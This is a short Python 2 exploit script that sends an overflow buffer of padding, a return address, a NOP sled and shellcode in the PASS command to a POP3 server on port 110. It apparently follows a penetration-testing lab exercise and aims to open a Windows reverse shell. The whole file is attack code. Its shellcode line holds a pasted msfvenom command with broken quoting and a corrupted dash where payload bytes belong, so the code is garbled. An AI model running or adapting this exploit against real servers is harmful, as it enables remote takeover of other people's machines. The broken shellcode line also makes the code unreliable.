#!/usr/bin/python

import socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

shellcode = ("$msfvenom -p windows/shell_reverse_tcp LHOST=<IP address> LPORT=<port> -f c â€“e x86/shikata_ga_nai -b "\x00\x0a\x0d"")

buffer = "A" * 2606 + "\x8f\x35\x4a\x5f" + "\x90" * 8 + shellcode

try:
    print "\nSending evil buffer..."
    s.connect(('<IP address>',110))
    data = s.recv(1024)
    s.send('USER username' +'\r\n')
    data = s.recv(1024)
    s.send('PASS ' + buffer + '\r\n')
    s.close()
    print "\ Done. Did you get a reverse shell?"
except:
    print "Could not connect to POP3!"
